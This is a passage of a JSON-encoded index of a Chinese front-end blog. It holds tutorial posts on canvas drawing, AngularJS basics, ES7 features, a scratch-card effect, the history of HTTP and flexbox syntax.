drawData.stY, Pointer = drawData.Pointer, Srad = Math.PI / 30 * timeArr[2], Mrad = Math.PI / 30 * timeArr[1]+Srad/60, Hrad = Math.PI / 30 * (timeArr[0] * 5)+Mrad/12, end = [ this.roundPosition(stX, stY, Pointer.H[2], -Hrad), this.roundPosition(stX, stY, Pointer.M[2], -Mrad), this.roundPosition(stX, stY, Pointer.S[2], -Srad), ] var i = 0 for(var key in Pointer) &#123; this.drawLine(&#123; ctx: ctx, stX: stX, stY: stY, endX: end[i].endX, endY: end[i].endY &#125;); this.washStroke(ctx, Pointer[key][0], Pointer[key][1]); //尖角 ctx.save(); ctx.translate(end[i].endX, end[i].endY); ctx.rotate(-end[i].rad) ctx.moveTo(0, 0); ctx.lineTo(Pointer[key][1] / 2, 0); ctx.lineTo(0, Pointer[key][3]); ctx.lineTo(-Pointer[key][1] / 2, 0); ctx.lineTo(0, 0) ctx.fillStyle = Pointer[key][0] ctx.fill() ctx.restore() this.drawbun(&#123; ctx: ctx, x: stX, y: stY, r: 6, &#125;); this.washFill(ctx, \"red\"); i++; &#125; &#125;, //划线 washStroke: function(ctx, color, lineWidth) &#123; ctx.lineWidth = lineWidth; ctx.strokeStyle = color; ctx.stroke(); &#125;, //填充 washFill: function(ctx, color) &#123; ctx.fillStyle = color; ctx.fill(); &#125;, drawLine: function(positionObj) &#123; var ctx = positionObj.ctx; ctx.beginPath(); ctx.moveTo(positionObj.stX, positionObj.stY); ctx.lineTo(positionObj.endX, positionObj.endY); &#125;, //绘制填充文字 drawFillText: function(positionObj) &#123; var ctx = positionObj.ctx; ctx.textBaseline = positionObj.textBaseline; ctx.textAlign = positionObj.textAlign; ctx.font = positionObj.size + \" \" + positionObj.family; ctx.fillStyle = positionObj.color || \"#ff7544\" ctx.fillText(positionObj.text, positionObj.x, positionObj.y); &#125;&#125;","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"canvas","slug":"canvas","permalink":"http://www.wanyifeng.top/tags/canvas/"}]},{"title":"Angular简单入门","date":"2016-11-05T07:33:21.000Z","path":"2016/11/05/Angular简单入门/","text":"代码解析代码解析 当网页加载完毕，AngularJS 自动开始执行 HTML 页面中 ng-xxx 的属性称之为指令（Directive） ng-app 指令告诉 AngularJS ，&lt;body&gt; 元素是 AngularJS 应用程序管理的边界 ng-init 指令初始化 AngularJS 应用程序变量 ng-model 指令把文本框的 value 值绑定到变量 name 上 表达式就是把应用程序变量 name 绑定到某个元素的 innerHTML 解析过程如下图： 文件系统架构 指令 ng-app 入口 ng-init 初始化变量的入口 一般在 js中 一般情况下不使用 ngModel 专门用来和表单控件建立双向数据绑定的 ngClick 元素的点击事件 ngRepeat 循环遍历 ngClass 可以根据模型数据成员的属性值，动态的添加或者删除样式类 ng-class=”{样式类名: bool值[,样式类名: bool值]}” ngSubmit 表单的提交事件 一种点击 type 为 submit 的按钮 一种是在文本类型的 input 中敲回车也会默认触发表单的 submit 事件 ng 控制器 视图模型 作用域 ng 模块 模块创建模块： 1angular.module('模块名称', []) 启动模块： 12345// 指令方式启动ng-app=\"模块名\"// 代码方式启动angular.bootstrap(document, ['模块名']) 获取模块： 1angular.module('模块名') 启动多个模块（就是将多个模块组织到一起，然后作用到某个具体的DOM节点上）： 1angular.bootstrap(document, ['模块名'[,'模块名']]) 多模块启动最佳实践： 1234567angular.module('app1', []).controller('AController')angular.module('app2', []).controller('BController')angular.module('app3', []).controller('CController')angular.module('mainApp', ['app1', 'app2', 'app3'])// 最后在 HTML 中通过 ng-app 加载 mainApp 就可以使用 app1、app2、app3 中的所有控制器成员了// 代码如下 html: 12345678&lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body ng-app=\"mainApp\"&gt; &lt;div ng-controller=\"AController\"&gt;&lt;/div&gt; &lt;div ng-controller=\"BController\"&gt;&lt;/div&gt; &lt;div ng-controller=\"CController\"&gt;&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 如何划分模块： 控制器按照页面具体的业务功能来划分 模块就是将处理相关联业务的控制器组织到一起 这样无论是从代码结构组织上还是可维护性上都是一种比较好的实践方式 控制器的方式1234567891011121314// 第三方方式，可以避免代码压缩导致的控制器形参无法使用的问题angular.module('app', []) .controller('MainController', [ '$scope',//数据模型 '$window',//window '$timeout',//自带的定时器对象 function ($scope, $window, $timeout) &#123; $scope.foo = 'main' $window.alert('hello angular') $timeout(function () &#123; $window.alert('哈哈') &#125;, 1000) &#125; ]) // 依赖项[, 依赖项], function () &#123;&#125; Angular 过滤器内置过滤器自定义过滤器12345678angular.module('模块') .filter('过滤器名称', function () &#123; return function (input, a, b) &#123; // input 就是使用过滤器的表达式计算结果 // 如果想要支持参数，则在方法中依次接收即可 // 在 HTML 中使用的时候，通过 :参数 来给过滤器传递参数 &#125; &#125;) 多控制器的方式123456789101112131415161718angular.module('Demo1App', []) .controller('Demo1Controller', ['$scope', function ($scope) &#123; $scope.foo = 'Demo1Controller' &#125;]) angular.module('Demo2App', []) .controller('Demo2Controller', ['$scope', function ($scope) &#123; $scope.foo = 'Demo2Controller' &#125;]) // 第一个参数：给一个作用 DOM 节点 // 这种方式只是将两个模块结合到一起了 // angular.bootstrap(document, ['Demo2App', 'Demo1App']) // 如果多个模块有同名控制器，后面的会覆盖前面的 // 最佳实践：创建一个主模块，然后将其它模块加载依赖到一起，通过 ng-app 指令把主模块作用起来就可以了 // 控制器是将一个视图中，不同的业务来进行划分 // 模块，是基于控制器之上的一层划分，将处理相同某个业务的多个控制器组织到一起 // 这样的话无论是从代码的结构性还是可维护性来说都是比较好的一种实践方式 // 最后一定要注意：多个模块之间如果加载到一起不要有重名的控制器，否则后面的会覆盖前面的 angular.module('MainApp', ['Demo1App', 'Demo2App'])","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"Angular","slug":"Angular","permalink":"http://www.wanyifeng.top/tags/Angular/"}]},{"title":"Angular底层原理和路由底层原理","date":"2016-11-05T06:33:21.000Z","path":"2016/11/05/Angular-单页应用-底层原理/","text":"windown对象的hashchange事件 windown,location拿到锚点 object.observe() 事件监听12345678910111213// 假设我们这里有个数据模型var model = &#123;&#125;;// 我们来对它进行监听Object.observe(model, function(changes)&#123; // 这个异步回调函数将被执行 changes.forEach(function(change) &#123; // 我们知道了都发生了哪些变化 console.log(change.type, change.name, change.oldValue); &#125;);&#125;); 是一个用于异步监听JavaScript对象变化的方法，并且无需使用额外的JavaScript库。它允许监听器接受一个按时间顺序排列的变更记录序列，这些变更记录描述了被监听对象所发生变化的内容的集合 通过Object.observe()可以在不使用任何框架的前提下轻松实现双向数据绑定。 当然这并不是说你不应该使用它们（框架）。对于那些业务逻辑复杂的大工程，这些框架还是非常有价值的。它们缩小了开发者的关注面，减少了需要维护的代码，并且固化了常见任务的实现模式。如果不需要，你也可以选择一些更小更具针对性的库，比如Polymer（它已经是O.o()的受益者了）。 即使你发现自己正重度依赖一些框架或MV*库，O.o()也有可能以一个更快更简单的实现改善他们的性能，并同时保证API不变。举个例子，去年Angular进行了一个监听模型变化的测试。在benchmark上，使用脏检查的话每次更新需要耗费40毫秒，而O.o()只花了1~2毫秒（足足快了20~40倍）。 数据绑定不再需要一大堆的复杂代码，也意味着不再需要通过轮询来发现变化，因此也就意味着更长的电池续航！ 如果你已经爱上了O.o()，那么你可以跳到后面的特性介绍，或继续看看它都解决了哪些问题。 我们都想要监听些什么？当我们谈起数据监听时，通常是指观察一些特定的变化： JavaScript原生对象的改变 属性的添加、变动、删除 数组元素的添加或移除 对象原型的改变 数据绑定的重要性当你关注模型-视图的控制分离时，数据绑定就变得非常重要。HTML是一个很好的声明机制，但它完全是静态的。理想情况下，你希望只声明数据与DOM之间的关系，就能够让DOM保持最新。你将不再需要编写那些仅仅是在DOM和你的应用内部状态或服务器间进行数据交换的代码，从而节省大量的时间。 如果你的用户界面较为复杂，你需要维护数据模型中的多个属性与页面中多个元素的关系，这时数据绑定的优势尤为明显。这在当今的单页应用中非常普遍。 通过浏览器原生的数据监听，我们给予了JavaScript框架（还有你正在编写的小工具库）监听模型中数据变化的方法，且不用依赖我们现在正在使用的一些hack方法。 单次数据绑定ng-bind = “ :: 数据名字” 输出字符串ng-bind-html(“”) AngularJS 优缺点优点： AngularJS模板功能强大丰富，自带了极其丰富的angular指令。 AngularJS是完全可扩展的，与其他库的兼容效果很好，每一个功能可以修改或更换，以满足开发者独特的开发流程和功能的需求。 AngularJS是一个比较完善的前端MVC框架，包含服务，模板，数据双向绑定，模块化，路由，过滤器，依赖注入等所有功能； AngularJS是互联网巨人谷歌开发，这也意味着他有一个坚实的基础和社区支持。 缺点： AngularJS强约束导致学习成本较高，对前端不友好。但遵守 AngularJS 的约定时，生产力会很高，对 后台服务器开发程序员友好。 AngularJS不利于SEO，因为所有内容都是动态获取并渲染生成的，搜索引擎没法爬取。 AngularJS作为 MVVM 框架，因为实现了数据的双向绑定，对于大数组、复杂对象会存在性能问题。 AngularJS 使用场景 单页面应用程序 复杂的后台管理系统 CRUD（增加 Create、查询 Retrieve、更新 Update、删除 Delete） 繁杂的 DOM 操作处理的页面 Angular 是一个类 MVC 类结构的 JavaScript 框架，建议构建 CRUD 类型应用的时候使用它，而对于那些图形编辑、游戏开发等应用，使用 Angular 就不如调用其它 JavaScript 类库方便，如 jQuery。","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"Angular","slug":"Angular","permalink":"http://www.wanyifeng.top/tags/Angular/"}]},{"title":"ES7初探","date":"2016-11-05T02:33:21.000Z","path":"2016/11/05/es7初探/","text":"数组的indexof方法增强 Array.prototype.includes 语法 1Array.prototype.includes（value：任意值）： boolean 如果传入的值在当前数组（this）中则返回 true，否则返回 false： 123456789101112 ['a', 'b', 'c'].includes('a')true ['a', 'b', 'c'].includes('d')false///includes 方法与 indexOf 方法很相似——下面两个表达式是等价的：arr.includes(x)arr.indexOf(x) &gt;= 0//唯一的区别是 includes() 方法能找到 NaN，而 indexOf() 不行：[NaN].includes(NaN)true[NaN].indexOf(NaN)-1 指数运算符 新提出来的特性是将 ** 作为指数操作的中缀运算符： 123x ** y //与以下表达式运算结果相同：Math.pow(x, y) 异步函数 123456789101112async function sleep(timeout) &#123; return new Promise((resolve, reject) =&gt; &#123; setTimeout(function() &#123; resolve(); &#125;, timeout); &#125;);&#125;(async function() &#123; console.log('Do some thing, ' + new Date()); await sleep(3000); console.log('Do other things, ' + new Date());&#125;)(); 执行此段代码，可以在终端中看到结果： Do some thing, Mon Feb 23 2015 21:52:11 GMT+0800 (CST)Do other things, Mon Feb 23 2015 21:52:14 GMT+0800 (CST 可以参考下 Promise http://www.cnblogs.com/lvdabao/p/es6-promise-1.html","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"canvas实现刮刮乐效果","date":"2016-11-05T02:13:51.000Z","path":"2016/11/05/canvas实现刮刮乐效果/","text":"基于jq实现 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;canvas id=\"canvas\" width=\"240\" height=\"240\"&gt;&lt;/canvas&gt;&lt;script type=\"text/javascript\"&gt; var myCanvas = document.querySelector('#myCanvas'); var ctx = myCanvas.getContext('2d'); //1:绘制画布的填充 ctx.fillStyle = 'rgba(255,20,147,1)'; ctx.fillRect(0, 0, myCanvas.width, myCanvas.height); //2:绘制画布的背景图 myCanvas.style.background = \"url(xxx.jpg) no-repeat center/cover\"; //3.绘制覆盖层,原画布中与当前画布重复的部分的透明度变为0 ctx.globalCompositeOperation = 'destination-out'; //4.实现刮的效果：鼠标按下并拖动的事件 $(\"#myCanvas\").on(\"mousedown\", function() &#123; $(\"#myCanvas\").on(\"mousemove\", function(event) &#123; //4.1获取鼠标在当前画布中的坐标 var centerX = event.pageX - myCanvas.offsetLeft; var centerY = event.pageY - myCanvas.offsetTop; ctx.beginPath(); ctx.arc(centerX, centerY, 20, 0, Math.PI * 2); ctx.fill(); /* *4.2判断:当当前画布中被刮出的像素点的个数大于当前画布中像素点的总个数的时候 * 一次性的刮出全部:清空当前画布 * 4.2.1: 获取当前画布中所有的像素点的个数 * 4.2.2: 获取当前画布中所有的未涂抹的像素点的个数 * 或者是获取当前画布中已经涂抹的像素点的个数 * * * */ ImageData = ctx.getImageData(0, 0, myCanvas.width, myCanvas.height); //已经涂抹的像素点的个数 var pixelNumber=0; for (var i = 0; i &lt; ImageData.data.length; i+=4) &#123; if(ImageData.data[i+3]==0)&#123; pixelNumber++; &#125; &#125; console.log(pixelNumber); if(pixelNumber&gt;ImageData.data.length/2/4)&#123; ctx.clearRect(0,0,myCanvas.width,myCanvas.height); $(\"#myCanvas\").off(\"mousedown mousemove\"); &#125; &#125;) &#125;); //5.事件的移除 $(\"#myCanvas\").on(\"mouseup mouseout\", function() &#123; $(\"#myCanvas\").off(\"mousemove\"); &#125;);&lt;/script&gt; 基于原生js 12345678910111213141516171819202122232425262728293031323334353637&lt;canvas id=\"canvas\" width=\"240\" height=\"240\"&gt;&lt;/canvas&gt;&lt;script type=\"text/javascript\"&gt; var canvas = document.querySelector(\"canvas\"), ctx = canvas.getContext(\"2d\"); canvas.style.backgroundImage = \"url(img/xxx.jpg)\"; ctx.fillStyle = \"#ccc\" ctx.fillRect(0, 0, canvas.width, canvas.height) ctx.beginPath() ctx.globalCompositeOperation = \"destination-out\" canvas.addEventListener(\"mousedown\", function() &#123; this.addEventListener(\"mousemove\", event) &#125;) canvas.addEventListener(\"mouseup\", function() &#123; this.removeEventListener(\"mousemove\", event) &#125;) canvas.addEventListener(\"mouseover\", function() &#123; this.removeEventListener(\"mousemove\", event) &#125;) function event(e) &#123; var x = e.pageX - this.offsetLeft; var y = e.pageY - this.offsetTop; var data = ctx.getImageData(0, 0, canvas.width, canvas.height).data var num = 0; ctx.arc(x, y, 20, 0, Math.PI * 2) ctx.fill(); ctx.beginPath() for(var i = 0; i &lt; data.length; i += 4) &#123; if(data[i] == 0 &amp;&amp; data[i + 1] == 0 &amp;&amp; data[i + 2] == 0 &amp;&amp; data[i + 3] == 0) &#123; num++ &#125; &#125; if(num&gt;canvas.width*canvas.height/2)&#123; ctx.clearRect(0,0,canvas.width,canvas.height) &#125; &#125;&lt;/script&gt;","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"canvas","slug":"canvas","permalink":"http://www.wanyifeng.top/tags/canvas/"}]},{"title":"HTTP 协议入门","date":"2016-10-17T02:38:11.000Z","path":"2016/10/17/HTTP 协议入门/","text":"作者： 阮一峰 日期： 2016年8月19日 HTTP 协议是互联网的基础协议，也是网页开发的必备知识，最新版本 HTTP/2 更是让它成为技术热点。 本文介绍 HTTP 协议的历史演变和设计思路。 一、HTTP/0.9HTTP 是基于 TCP/IP 协议的应用层协议。它不涉及数据包（packet）传输，主要规定了客户端和服务器之间的通信格式，默认使用80端口。 最早版本是1991年发布的0.9版。该版本极其简单，只有一个命令GET。 123&gt; GET /index.html&gt;&gt; 上面命令表示，TCP 连接（connection）建立后，客户端向服务器请求（request）网页index.html。 协议规定，服务器只能回应HTML格式的字符串，不能回应别的格式。 12345&gt; &lt;html&gt;&gt; &lt;body&gt;Hello World&lt;/body&gt;&gt; &lt;/html&gt;&gt;&gt; 服务器发送完毕，就关闭TCP连接。 二、HTTP/1.02.1 简介1996年5月，HTTP/1.0 版本发布，内容大大增加。 首先，任何格式的内容都可以发送。这使得互联网不仅可以传输文字，还能传输图像、视频、二进制文件。这为互联网的大发展奠定了基础。 其次，除了GET命令，还引入了POST命令和HEAD命令，丰富了浏览器与服务器的互动手段。 再次，HTTP请求和回应的格式也变了。除了数据部分，每次通信都必须包括头信息（HTTP header），用来描述一些元数据。 其他的新增功能还包括状态码（status code）、多字符集支持、多部分发送（multi-part type）、权限（authorization）、缓存（cache）、内容编码（content encoding）等。 2.2 请求格式下面是一个1.0版的HTTP请求的例子。 12345&gt; GET / HTTP/1.0&gt; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5)&gt; Accept: */*&gt;&gt; 可以看到，这个格式与0.9版有很大变化。 第一行是请求命令，必须在尾部添加协议版本（HTTP/1.0）。后面就是多行头信息，描述客户端的情况。 2.3 回应格式服务器的回应如下。 123456789101112&gt; HTTP/1.0 200 OK &gt; Content-Type: text/plain&gt; Content-Length: 137582&gt; Expires: Thu, 05 Dec 1997 16:00:00 GMT&gt; Last-Modified: Wed, 5 August 1996 15:55:28 GMT&gt; Server: Apache 0.84&gt;&gt; &lt;html&gt;&gt; &lt;body&gt;Hello World&lt;/body&gt;&gt; &lt;/html&gt;&gt;&gt; 回应的格式是”头信息 + 一个空行（\\r\\n） + 数据”。其中，第一行是”协议版本 + 状态码（status code） + 状态描述”。 2.4 Content-Type 字段关于字符的编码，1.0版规定，头信息必须是 ASCII 码，后面的数据可以是任何格式。因此，服务器回应的时候，必须告诉客户端，数据是什么格式，这就是Content-Type字段的作用。 下面是一些常见的Content-Type字段的值。 text/plain text/html text/css image/jpeg image/png image/svg+xml audio/mp4 video/mp4 application/javascript application/pdf application/zip application/atom+xml 这些数据类型总称为MIME type，每个值包括一级类型和二级类型，之间用斜杠分隔。 除了预定义的类型，厂商也可以自定义类型。 123&gt; application/vnd.debian.binary-package&gt;&gt; 上面的类型表明，发送的是Debian系统的二进制数据包。 MIME type还可以在尾部使用分号，添加参数。 123&gt; Content-Type: text/html; charset=utf-8&gt;&gt; 上面的类型表明，发送的是网页，而且编码是UTF-8。 客户端请求的时候，可以使用Accept字段声明自己可以接受哪些数据格式。 123&gt; Accept: */*&gt;&gt; 上面代码中，客户端声明自己可以接受任何格式的数据。 MIME type不仅用在HTTP协议，还可以用在其他地方，比如HTML网页。 12345&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /&gt;&gt; &lt;!-- 等同于 --&gt;&gt; &lt;meta charset=\"utf-8\" /&gt; &gt;&gt; 2.5 Content-Encoding 字段由于发送的数据可以是任何格式，因此可以把数据压缩后再发送。Content-Encoding字段说明数据的压缩方法。 12345&gt; Content-Encoding: gzip&gt; Content-Encoding: compress&gt; Content-Encoding: deflate&gt;&gt; 客户端在请求时，用Accept-Encoding字段说明自己可以接受哪些压缩方法。 123&gt; Accept-Encoding: gzip, deflate&gt;&gt; 2.6 缺点HTTP/1.0 版的主要缺点是，每个TCP连接只能发送一个请求。发送数据完毕，连接就关闭，如果还要请求其他资源，就必须再新建一个连接。 TCP连接的新建成本很高，因为需要客户端和服务器三次握手，并且开始时发送速率较慢（slow start）。所以，HTTP 1.0版本的性能比较差。随着网页加载的外部资源越来越多，这个问题就愈发突出了。 为了解决这个问题，有些浏览器在请求时，用了一个非标准的Connection字段。 123&gt; Connection: keep-alive&gt;&gt; 这个字段要求服务器不要关闭TCP连接，以便其他请求复用。服务器同样回应这个字段。 123&gt; Connection: keep-alive&gt;&gt; 一个可以复用的TCP连接就建立了，直到客户端或服务器主动关闭连接。但是，这不是标准字段，不同实现的行为可能不一致，因此不是根本的解决办法。 三、HTTP/1.11997年1月，HTTP/1.1 版本发布，只比 1.0 版本晚了半年。它进一步完善了 HTTP 协议，一直用到了20年后的今天，直到现在还是最流行的版本。 3.1 持久连接1.1 版的最大变化，就是引入了持久连接（persistent connection），即TCP连接默认不关闭，可以被多个请求复用，不用声明Connection: keep-alive。 客户端和服务器发现对方一段时间没有活动，就可以主动关闭连接。不过，规范的做法是，客户端在最后一个请求时，发送Connection: close，明确要求服务器关闭TCP连接。 123&gt; Connection: close&gt;&gt; 目前，对于同一个域名，大多数浏览器允许同时建立6个持久连接。 3.2 管道机制1.1 版还引入了管道机制（pipelining），即在同一个TCP连接里面，客户端可以同时发送多个请求。这样就进一步改进了HTTP协议的效率。 举例来说，客户端需要请求两个资源。以前的做法是，在同一个TCP连接里面，先发送A请求，然后等待服务器做出回应，收到后再发出B请求。管道机制则是允许浏览器同时发出A请求和B请求，但是服务器还是按照顺序，先回应A请求，完成后再回应B请求。 3.3 Content-Length 字段一个TCP连接现在可以传送多个回应，势必就要有一种机制，区分数据包是属于哪一个回应的。这就是Content-length字段的作用，声明本次回应的数据长度。 123&gt; Content-Length: 3495&gt;&gt; 上面代码告诉浏览器，本次回应的长度是3495个字节，后面的字节就属于下一个回应了。 在1.0版中，Content-Length字段不是必需的，因为浏览器发现服务器关闭了TCP连接，就表明收到的数据包已经全了。 3.4 分块传输编码使用Content-Length字段的前提条件是，服务器发送回应之前，必须知道回应的数据长度。 对于一些很耗时的动态操作来说，这意味着，服务器要等到所有操作完成，才能发送数据，显然这样的效率不高。更好的处理方法是，产生一块数据，就发送一块，采用”流模式”（stream）取代”缓存模式”（buffer）。 因此，1.1版规定可以不使用Content-Length字段，而使用“分块传输编码”（chunked transfer encoding）。只要请求或回应的头信息有Transfer-Encoding字段，就表明回应将由数量未定的数据块组成。 123&gt; Transfer-Encoding: chunked&gt;&gt; 每个非空的数据块之前，会有一个16进制的数值，表示这个块的长度。最后是一个大小为0的块，就表示本次回应的数据发送完了。下面是一个例子。 1234567891011121314151617181920&gt; HTTP/1.1 200 OK&gt; Content-Type: text/plain&gt; Transfer-Encoding: chunked&gt;&gt; 25&gt; This is the data in the first chunk&gt;&gt; 1C&gt; and this is the second one&gt;&gt; 3&gt; con&gt;&gt; 8&gt; sequence&gt;&gt; 0&gt;&gt;&gt; 3.5 其他功能1.1版还新增了许多动词方法：PUT、PATCH、HEAD、 OPTIONS、DELETE。 另外，客户端请求的头信息新增了Host字段，用来指定服务器的域名。 123&gt; Host: www.example.com&gt;&gt; 有了Host字段，就可以将请求发往同一台服务器上的不同网站，为虚拟主机的兴起打下了基础。 3.6 缺点虽然1.1版允许复用TCP连接，但是同一个TCP连接里面，所有的数据通信是按次序进行的。服务器只有处理完一个回应，才会进行下一个回应。要是前面的回应特别慢，后面就会有许多请求排队等着。这称为“队头堵塞”（Head-of-line blocking）。 为了避免这个问题，只有两种方法：一是减少请求数，二是同时多开持久连接。这导致了很多的网页优化技巧，比如合并脚本和样式表、将图片嵌入CSS代码、域名分片（domain sharding）等等。如果HTTP协议设计得更好一些，这些额外的工作是可以避免的。 四、SPDY 协议2009年，谷歌公开了自行研发的 SPDY 协议，主要解决 HTTP/1.1 效率不高的问题。 这个协议在Chrome浏览器上证明可行以后，就被当作 HTTP/2 的基础，主要特性都在 HTTP/2 之中得到继承。 五、HTTP/22015年，HTTP/2 发布。它不叫 HTTP/2.0，是因为标准委员会不打算再发布子版本了，下一个新版本将是 HTTP/3。 5.1 二进制协议HTTP/1.1 版的头信息肯定是文本（ASCII编码），数据体可以是文本，也可以是二进制。HTTP/2 则是一个彻底的二进制协议，头信息和数据体都是二进制，并且统称为”帧”（frame）：头信息帧和数据帧。 二进制协议的一个好处是，可以定义额外的帧。HTTP/2 定义了近十种帧，为将来的高级应用打好了基础。如果使用文本实现这种功能，解析数据将会变得非常麻烦，二进制解析则方便得多。 5.2 多工HTTP/2 复用TCP连接，在一个连接里，客户端和浏览器都可以同时发送多个请求或回应，而且不用按照顺序一一对应，这样就避免了”队头堵塞”。 举例来说，在一个TCP连接里面，服务器同时收到了A请求和B请求，于是先回应A请求，结果发现处理过程非常耗时，于是就发送A请求已经处理好的部分， 接着回应B请求，完成后，再发送A请求剩下的部分。 这样双向的、实时的通信，就叫做多工（Multiplexing）。 5.3 数据流因为 HTTP/2 的数据包是不按顺序发送的，同一个连接里面连续的数据包，可能属于不同的回应。因此，必须要对数据包做标记，指出它属于哪个回应。 HTTP/2 将每个请求或回应的所有数据包，称为一个数据流（stream）。每个数据流都有一个独一无二的编号。数据包发送的时候，都必须标记数据流ID，用来区分它属于哪个数据流。另外还规定，客户端发出的数据流，ID一律为奇数，服务器发出的，ID为偶数。 数据流发送到一半的时候，客户端和服务器都可以发送信号（RST_STREAM帧），取消这个数据流。1.1版取消数据流的唯一方法，就是关闭TCP连接。这就是说，HTTP/2 可以取消某一次请求，同时保证TCP连接还打开着，可以被其他请求使用。 客户端还可以指定数据流的优先级。优先级越高，服务器就会越早回应。 5.4 头信息压缩HTTP 协议不带有状态，每次请求都必须附上所有信息。所以，请求的很多字段都是重复的，比如Cookie和User Agent，一模一样的内容，每次请求都必须附带，这会浪费很多带宽，也影响速度。 HTTP/2 对这一点做了优化，引入了头信息压缩机制（header compression）。一方面，头信息使用gzip或compress压缩后再发送；另一方面，客户端和服务器同时维护一张头信息表，所有字段都会存入这个表，生成一个索引号，以后就不发送同样字段了，只发送索引号，这样就提高速度了。 5.5 服务器推送HTTP/2 允许服务器未经请求，主动向客户端发送资源，这叫做服务器推送（server push）。 常见场景是客户端请求一个网页，这个网页里面包含很多静态资源。正常情况下，客户端必须收到网页后，解析HTML源码，发现有静态资源，再发出静态资源请求。其实，服务器可以预期到客户端请求网页后，很可能会再请求静态资源，所以就主动把这些静态资源随着网页一起发给客户端了。 转载 http://www.ruanyifeng.com/blog/2016/08/http.html","comments":true,"tags":[{"name":"http","slug":"http","permalink":"http://www.wanyifeng.top/tags/http/"}]},{"title":"Flex布局","date":"2016-10-15T03:23:21.000Z","path":"2016/10/15/flex布局/","text":"首先还是从两个版本的语法开始讲吧，这里还是假设flex容器为 .box ，子元素为 .item 。 旧语法篇 定义容器的display属性 12345.box&#123; display: -webkit-box; /*Safari,Opera,Chrome*/ display: -moz-box; /*Firefox*/ display: box;&#125; 容器属性 1.box-pack 属性 box-pack定义子元素主轴对齐方式。 12345.box&#123; -moz-box-pack: center; /*Firefox*/ -webkit-box-pack: center; /*Safari,Opera,Chrome*/ box-pack: center;&#125; box-pack属性总共有4个值： 1234.box&#123; /*主轴对齐：左对齐（默认） | 右对齐 | 居中对齐 | 左右对齐*/ box-pack: start | end | center | justify;&#125; 2.box-align 属性 box-align定义子元素交叉轴对齐方式。 12345.box&#123; -moz-box-align: center; /*Firefox*/ -webkit-box-align: center; /*Safari,Opera,Chrome*/ box-align: center;&#125; box-align属性总共有5个值： 1234.box&#123; box-align: start | end | center | baseline | stretch; /*交叉轴对齐：顶部对齐（默认） | 底部对齐 | 居中对齐 | 文本基线对齐 | 上下对齐并铺满*/&#125; 3.box-direction 属性 box-direction定义子元素的显示方向。 12345.box&#123; -moz-box-direction: reverse; /*Firefox*/ -webkit-box-direction: reverse; /*Safari,Opera,Chrome*/ box-direction: reverse;&#125; box-direction属性总共有3个值： 1234.box&#123; box-direction: normal | reverse | inherit; /*显示方向：默认方向 | 反方向 | 继承子元素的 box-direction*/&#125; 4.box-orient 属性 box-orient定义子元素是否应水平或垂直排列。 12345.box&#123; -moz-box-orient: horizontal; /*Firefox*/ -webkit-box-orient: horizontal; /*Safari,Opera,Chrome*/ box-orient: horizontal;&#125; box-orient属性总共有5个值： 1234.box&#123; box-orient: horizontal | vertical | inline-axis | block-axis | inherit; /*排列方向：水平 | 垂直 | 行内方式排列（默认） | 块方式排列 | 继承父级的box-orient*/&#125; 5.box-lines 属性 box-lines定义当子元素超出了容器是否允许子元素换行。12345.box&#123; -moz-box-lines: multiple; /*Firefox*/ -webkit-box-lines: multiple; /*Safari,Opera,Chrome*/ box-lines: multiple;&#125; box-lines属性总共有2个值： 1234.box&#123; box-lines: single | multiple; /*允许换行：不允许（默认） | 允许*/&#125; 子元素属性 1.box-flex 属性 box-flex定义是否允许当前子元素伸缩。 12345.item&#123; -moz-box-flex: 1.0; /*Firefox*/ -webkit-box-flex: 1.0; /*Safari,Opera,Chrome*/ box-flex: 1.0;&#125; box-flex属性使用一个浮点值： 1234.item&#123; box-flex: &lt;value; /*伸缩：&lt;一个浮点数，默认为0.0，即表示不可伸缩，大于0的值可伸缩，柔性相对*/&#125; 2.box-ordinal-group 属性 box-ordinal-group定义子元素的显示次序，数值越小越排前。12345.item&#123; -moz-box-ordinal-group: 1; /*Firefox*/ -webkit-box-ordinal-group: 1; /*Safari,Opera,Chrome*/ box-ordinal-group: 1;&#125; box-direction属性使用一个整数值：1234.item&#123; box-ordinal-group: &lt;integer; /*显示次序：&lt;一个整数，默认为1，数值越小越排前*/&#125; 新版语法 定义容器的display属性 1234567891011.box&#123;display: -webkit-flex; /*webkit*/display: flex;&#125;/*行内flex*/.box&#123; display: -webkit-inline-flex; /*webkit*/ display:inline-flex;&#125; 容器样式 1234567891011121314.box&#123; flex-direction: row | row-reverse | column | column-reverse; /*主轴方向：左到右（默认） | 右到左 | 上到下 | 下到上*/ flex-wrap: nowrap | wrap | wrap-reverse; /*换行：不换行（默认） | 换行 | 换行并第一行在下方*/ flex-flow: &lt;flex-direction || &lt;flex-wrap; /*主轴方向和换行简写*/ justify-content: flex-start | flex-end | center | space-between | space-around; /*主轴对齐方式：左对齐（默认） | 右对齐 | 居中对齐 | 两端对齐 | 平均分布*/ align-items: flex-start | flex-end | center | baseline | stretch; /*交叉轴对齐方式：顶部对齐（默认） | 底部对齐 | 居中对齐 | 上下对齐并铺满 | 文本基线对齐*/ align-content: flex-start | flex-end | center | space-between | space-around | stretch; /*多主轴对齐：顶部对齐（默认） | 底部对齐 | 居中对齐 | 上下对齐并铺满 | 上下平均分布*/&#125; 子元素属性 1234567891011121314.item&#123; order: &lt;integer; /*排序：数值越小，越排前，默认为0*/ flex-grow: &lt;number; /* default 0 */ /*放大：默认0（即如果有剩余空间也不放大，值为1则放大，2是1的双倍大小，以此类推）*/ flex-shrink: &lt;number; /* default 1 */ /*缩小：默认1（如果空间不足则会缩小，值为0不缩小）*/ flex-basis: &lt;length | auto; /* default auto */ /*固定大小：默认为0，可以设置px值，也可以设置百分比大小*/ flex: none | [ &lt;'flex-grow' &lt;'flex-shrink'? || &lt;'flex-basis' ] /*flex-grow, flex-shrink 和 